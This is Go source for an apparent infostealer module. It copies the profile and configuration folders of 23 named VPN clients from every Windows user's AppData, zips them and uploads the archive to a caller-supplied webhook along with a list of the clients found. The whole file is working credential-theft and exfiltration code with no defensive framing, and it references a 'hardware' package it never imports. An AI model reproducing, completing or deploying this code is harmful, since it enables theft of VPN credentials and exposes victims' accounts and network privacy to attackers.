package vpn

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/mmmhlecaca/enori/utils/fileutil"
	"github.com/mmmhlecaca/enori/utils/requests"
)

func Run(webhook string) {
	for _, user := range hardware.GetUsers() {
		paths := map[string]string{
			"OpenVPN Connect":         filepath.Join(user, "AppData", "Roaming", "OpenVPN Connect", "profiles"),
			"Mullvad VPN":             filepath.Join(user, "AppData", "Roaming", "Mullvad VPN"),
			"Proton VPN":              filepath.Join(user, "AppData", "Local", "ProtonVPN"),
			"Nord VPN":                filepath.Join(user, "AppData", "Local", "NordVPN"),
			"Express VPN":             filepath.Join(user, "AppData", "Local", "ExpressVPN"),
			"CyberGhost":              filepath.Join(user, "AppData", "Local", "CyberGhost"),
			"Surfshark":               filepath.Join(user, "AppData", "Local", "Surfshark"),
			"Vypr VPN":                filepath.Join(user, "AppData", "Local", "VyprVPN"),
			"Windscribe":              filepath.Join(user, "AppData", "Local", "Windscribe"),
			"Hide.me":                 filepath.Join(user, "AppData", "Local", "hide.me VPN"),
			"Hotspot Shield":          filepath.Join(user, "AppData", "Local", "Hotspot Shield"),
			"TunnelBear":              filepath.Join(user, "AppData", "Local", "TunnelBear"),
			"IPVanish":                filepath.Join(user, "AppData", "Local", "IPVanish"),
			"HMA":                     filepath.Join(user, "AppData", "Local", "HMA VPN"),
			"ZenMate":                 filepath.Join(user, "AppData", "Local", "ZenMate"),
			"Pure VPN":                filepath.Join(user, "AppData", "Local", "PureVPN"),
			"TorGuard":                filepath.Join(user, "AppData", "Local", "TorGuard"),
			"Betternet":               filepath.Join(user, "AppData", "Local", "Betternet"),
			"PrivateVPN":              filepath.Join(user, "AppData", "Local", "PrivateVPN"),
			"VPN Unlimited":           filepath.Join(user, "AppData", "Local", "VPN Unlimited"),
			"Goose VPN":               filepath.Join(user, "AppData", "Local", "GooseVPN"),
			"SaferVPN":                filepath.Join(user, "AppData", "Local", "SaferVPN"),
			"Private Internet Access": filepath.Join(user, "AppData", "Local", "Private Internet Access"),
		}

		tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("vpn-%s", strings.Split(user, "\\")[2]))
		found := ""

		for name, path := range paths {
			if !fileutil.Exists(path) || !fileutil.IsDir(path) {
				continue
			}

			dest := filepath.Join(tempDir, strings.Split(user, "\\")[2], name)
			if err := os.MkdirAll(dest, os.ModePerm); err != nil {
				continue
			}

			err := fileutil.CopyDir(path, dest)
			if err != nil {
				continue
			}

			if !strings.Contains(found, name) {
				found += fmt.Sprintf("\n✅ %s ", name)
			}
		}

		if found == "" {
			os.RemoveAll(tempDir)
			continue
		}

		tempZip := filepath.Join(os.TempDir(), "vpn.zip")
		if err := fileutil.Zip(tempDir, tempZip); err != nil {
			os.RemoveAll(tempDir)
			continue
		}
		requests.Webhook(webhook, map[string]interface{}{
			"embeds": []map[string]interface{}{
				{
					"title":       "VPNs",
					"description": "```" + found + "```",
				},
			},
		}, tempZip)

		os.RemoveAll(tempDir)
		os.Remove(tempZip)
	}
}